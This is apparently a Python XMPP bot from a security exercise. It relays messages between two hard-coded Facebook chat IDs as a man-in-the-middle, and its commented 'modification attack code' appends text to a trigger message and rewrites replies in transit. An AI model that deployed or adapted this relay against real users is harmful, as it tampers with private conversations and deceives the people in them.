#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import logging
import getpass
from optparse import OptionParser
import re

import sleekxmpp

if sys.version_info < (3, 0):
    reload(sys)
    sys.setdefaultencoding('utf8')
else:
    raw_input = input


class EchoBot(sleekxmpp.ClientXMPP):

    def __init__(self, jid, password):
        sleekxmpp.ClientXMPP.__init__(self, jid, password)

        # The session_start event will be triggered when
        # the bot establishes its connection with the server
        # and the XML streams are ready for use. We want to
        # listen for this event so that we we can initialize
        # our roster.
        self.add_event_handler("session_start", self.start)

        # The message event is triggered whenever a message
        # stanza is received.
        self.add_event_handler("message", self.message)

        self.flag = 0

    def start(self, event):
        """
        Process the session_start event.

        Typical actions for the session_start event are
        requesting the roster and broadcasting an initial
        presence stanza.

        Arguments:
            event -- An empty dictionary. The session_start
                     event does not provide any additional
                     data.
        """
        self.send_presence()
        self.get_roster()

    def message(self, msg):
        """
        Process incoming message stanzas. Be aware that this also
        includes MUC messages and error messages. 
        """


        #This is the modification attack code.
        #Check if the incoming message is the initialization string
        #if yes, set the flag and append the attack vector
        if msg['body'].lower() == 'how was the movie yesterday?'.lower() and self.flag == 0:
            msg['body'] = msg['body'] + ' and btw, whats your fav color?'
            self.flag = 1

        elif self.flag == 1:
            
            #check if response had the word color.
            colors = ['Pink', 'Red', 'Orange', 'Brown', 'Yellow', 'Gray', 'Green', 'Cyan', 'Blue', 'Violet']
            for x in colors:
                if msg['body'].__contains__(x.lower()):
                    #if yes, reset the flag and modify the outgoing message as well
                    msg['body'] = "you know my fav color is " + x + " whats yours?"
                    self.flag = 0


        if msg['type'] in ('chat', 'normal'):

            #if message from simran's id
            if msg['from'] == '-100003188198954@chat.facebook.com':

                #alex bot) will send the message to simranbot id
                sendto = '-100003024364455@chat.facebook.com'            
                
            #if message is from simran bot id
            elif msg['from'] == '-100003024364455@chat.facebook.com':
                
                #alex bot will send the message to simran's id
                sendto = '-100003188198954@chat.facebook.com'

            self.send_message(mto=sendto, mbody=msg['body'], mtype='chat')

if __name__ == '__main__':
    # Setup the command line arguments.
    optp = OptionParser()

    # Output verbosity options.
    optp.add_option('-q', '--quiet', help='set logging to ERROR',
                    action='store_const', dest='loglevel',
                    const=logging.ERROR, default=logging.INFO)
    optp.add_option('-d', '--debug', help='set logging to DEBUG',
                    action='store_const', dest='loglevel',
                    const=logging.DEBUG, default=logging.INFO)
    optp.add_option('-v', '--verbose', help='set logging to COMM',
                    action='store_const', dest='loglevel',
                    const=5, default=logging.INFO)

    # JID and password options.
    optp.add_option("-j", "--jid", dest="jid",
                    help="JID to use")
    optp.add_option("-p", "--password", dest="password",
                    help="password to use")

    opts, args = optp.parse_args()

    # Setup logging.
    logging.basicConfig(level=opts.loglevel,
                        format='%(levelname)-8s %(message)s')

    if opts.jid is None:
        opts.jid = raw_input("Username: ")
    if opts.password is None:
        opts.password = getpass.getpass("Password: ")

    # Setup the EchoBot and register plugins.
    xmpp = EchoBot(opts.jid, opts.password)
    xmpp.register_plugin('xep_0030') # Service Discovery
    xmpp.register_plugin('xep_0004') # Data Forms
    xmpp.register_plugin('xep_0060') # PubSub
    xmpp.register_plugin('xep_0199') # XMPP Ping

    # Connect to the XMPP server and start processing XMPP stanzas.
    if xmpp.connect():

        xmpp.process(block=True)
        print("Done")
    else:
        print("Unable to connect.")
